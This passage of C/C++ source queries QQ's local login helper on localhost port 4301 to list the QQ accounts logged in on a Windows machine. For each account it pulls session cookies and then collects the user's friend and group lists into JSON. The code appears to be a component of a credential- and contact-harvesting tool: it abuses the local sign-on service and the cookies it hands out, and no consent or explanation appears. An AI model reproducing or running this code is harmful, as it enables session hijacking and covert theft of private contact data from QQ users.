	sprintf(szGetName2, "/pt_get_uins?callback=ptui_getuins_CB&r=%s&%s", "0.9475416028552021", pt_local_tk);
	hRequest = HttpOpenRequest(hConnect, "GET", szGetName2, "HTTP/1.1", NULL, NULL, 0x80880010, NULL);
	if (hRequest == NULL)
	{
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	sprintf(szHeaders2, "Accept: */*\r\nReferer: https://localhost.ptlogin2.qq.com:4301%s\r\nAccept-Language: zh-cn\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: %s", szGetName2, szCookieData1);
	if (!HttpSendRequest(hRequest, szHeaders2, strlen(szHeaders2), NULL, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	if (!HttpQueryInfo(hRequest, HTTP_QUERY_CONTENT_LENGTH, szSizeBuffer2, &dwSizeBuffer2, 0))
	{
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	dwUtf8Buffer2 = atol(szSizeBuffer2) + 1;
	szUtf8Buffer2 = new char[dwUtf8Buffer2];
	memset(szUtf8Buffer2, 0, dwUtf8Buffer2);
	if (!InternetReadFile(hRequest, szUtf8Buffer2, dwUtf8Buffer2, &dwBytesRead))
	{
		delete[] szUtf8Buffer2;
		InternetCloseHandle(hRequest);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hInternet);
		return pQQLocalJson;
	}
	InternetCloseHandle(hRequest);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	dwWideBuffer2 = MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer2, -1, NULL, 0);
	szWideBuffer2 = new WCHAR[dwWideBuffer2 + 1];
	memset(szWideBuffer2, 0, dwWideBuffer2 * 2 + 2);
	MultiByteToWideChar(CP_UTF8, 0, szUtf8Buffer2, -1, szWideBuffer2, dwWideBuffer2);
	delete[] szUtf8Buffer2;
	dwAnsiBuffer2 = WideCharToMultiByte(CP_ACP, 0, szWideBuffer2, -1, NULL, 0, NULL, NULL);
	szAnsiBuffer2 = new char[dwAnsiBuffer2 + 1];
	memset(szAnsiBuffer2, 0, dwAnsiBuffer2 * 1 + 1);
	WideCharToMultiByte(CP_ACP, 0, szWideBuffer2, -1, szAnsiBuffer2, dwAnsiBuffer2, NULL, NULL);
	delete[] szWideBuffer2;
	pLPosition = strstr(szAnsiBuffer2, "[");
	if (pLPosition == NULL)
	{
		delete[] szAnsiBuffer2;
		return pQQLocalJson;
	}
	pQQLocalJson = cJSON_Parse(pLPosition);
	delete[] szAnsiBuffer2;
	if (pQQLocalJson == NULL)
		return pQQLocalJson;
	for (user = pQQLocalJson->child; user; user = user->next)
	{
		cJSON *nickname = cJSON_GetObjectItem(user, "nickname");
		cJSON *uin =cJSON_GetObjectItem(user, "uin");
		if (nickname == NULL || uin == NULL)
			continue;
		if (!GetQQCookieInfo(uin->valuestring, pt_local_tk, szCookieData1, szCookieData2, sizeof(szCookieData2)))
			continue;
		pQQFriendJson = GetQQFriendJson(szCookieData2);
		if (pQQFriendJson != NULL)
			cJSON_AddItemToObject(user, "friends", pQQFriendJson);
		pQQGroupJson = GetQQGroupJson(szCookieData2);
		if (pQQGroupJson != NULL)
			cJSON_AddItemToObject(user, "groups", pQQGroupJson);
	}
	return pQQLocalJson;
}
